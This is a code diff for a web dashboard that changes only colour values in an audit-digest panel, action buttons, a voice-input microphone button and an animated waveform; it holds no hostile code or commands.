+              <strong style="display:block;font-size:1.1rem;color:#3D65D6;">100% PASS</strong>
             </div>
           </div>
 
@@ -1451,16 +1451,16 @@
           <!-- Cryptographic Hash Evidence Box -->
           <div style="background:#0F172A;color:#E2E8F0;border-radius:6px;padding:12px;font-family:var(--font-mono);font-size:0.74rem;margin-bottom:16px;">
             <div style="color:#94A3B8;margin-bottom:4px;"># Cryptographic Audit Digest:</div>
-            <div>MERKLE_ROOT_SHA256: <span style="color:#38BDF8;">0x8f4c3b99a14d5e82b7194f10034a781290bb34dc61a5e12847ff8231aa924de1</span></div>
-            <div>HSM_KEY_ID:          <span style="color:#34D399;">HSM-SEC256K1-KAVACH-GOV-9921</span></div>
-            <div>ECDSA_SIGNATURE:     <span style="color:#FBBF24;">3045022100e4b892a71f83c18b2...a14d5e82b719</span></div>
+            <div>MERKLE_ROOT_SHA256: <span style="color:#52B8FF;">0x8f4c3b99a14d5e82b7194f10034a781290bb34dc61a5e12847ff8231aa924de1</span></div>
+            <div>HSM_KEY_ID:          <span style="color:#58CF9E;">HSM-SEC256K1-KAVACH-GOV-9921</span></div>
+            <div>ECDSA_SIGNATURE:     <span style="color:#FFBB53;">3045022100e4b892a71f83c18b2...a14d5e82b719</span></div>
           </div>
 
           <!-- Action Cluster -->
           <div style="display:flex;gap:10px;justify-content:flex-end;flex-wrap:wrap;">
             <button type="button" class="pill-btn" onclick="window.downloadCycloneDxJson()" style="background:#FFFFFF;color:#334155;border:1px solid #CBD5E1;">Download CycloneDX SBOM (JSON)</button>
             <button type="button" class="pill-btn" onclick="window.copyDossierDigest()" style="background:#FFFFFF;color:#334155;border:1px solid #CBD5E1;">Copy Merkle Digest</button>
-            <button type="button" class="btn-serious" onclick="window.printDossier()" style="background:#2563EB;color:#FFF;padding:6px 14px;">Print / Save as PDF</button>
+            <button type="button" class="btn-serious" onclick="window.printDossier()" style="background:#2764E8;color:#FFFFFF;padding:6px 14px;">Print / Save as PDF</button>
           </div>
         </div>
       `
@@ -1571,16 +1571,16 @@
 
     if (micBtn) {
       micBtn.classList.toggle('listening', isVoiceListening);
-      micBtn.style.background = isVoiceListening ? '#2563EB' : '#FFFFFF';
+      micBtn.style.background = isVoiceListening ? '#2764E8' : '#FFFFFF';
       micBtn.style.color = isVoiceListening ? '#FFFFFF' : '#334155';
-      micBtn.style.borderColor = isVoiceListening ? '#1D4ED8' : '#CBD5E1';
+      micBtn.style.borderColor = isVoiceListening ? '#1F50D4' : '#CBD5E1';
     }
 
     if (statusText) {
       statusText.textContent = isVoiceListening 
         ? "Listening... Speak a command or click a quick prompt below" 
         : "Idle · Microphone paused";
-      statusText.style.color = isVoiceListening ? '#2563EB' : '#64748B';
+      statusText.style.color = isVoiceListening ? '#2764E8' : '#64748B';
     }
   }
 
@@ -1598,9 +1598,9 @@
       wavePhase += 0.08;
 
       const lines = [
-        { color: 'rgba(37, 99, 235, 0.8)', freq: 0.03, amp: 18, offset: 0 },
-        { color: 'rgba(56, 189, 248, 0.6)', freq: 0.05, amp: 12, offset: 1.5 },
-        { color: 'rgba(99, 102, 241, 0.4)', freq: 0.02, amp: 22, offset: 3.0 }
+        { color: 'rgba(39, 100, 232, 0.8)', freq: 0.03, amp: 18, offset: 0 },
+        { color: 'rgba(82, 184, 255, 0.6)', freq: 0.05, amp: 12, offset: 1.5 },
+        { color: 'rgba(66, 111, 243, 0.4)', freq: 0.02, amp: 22, offset: 3.0 }
       ];
 
       lines.forEach(l => {
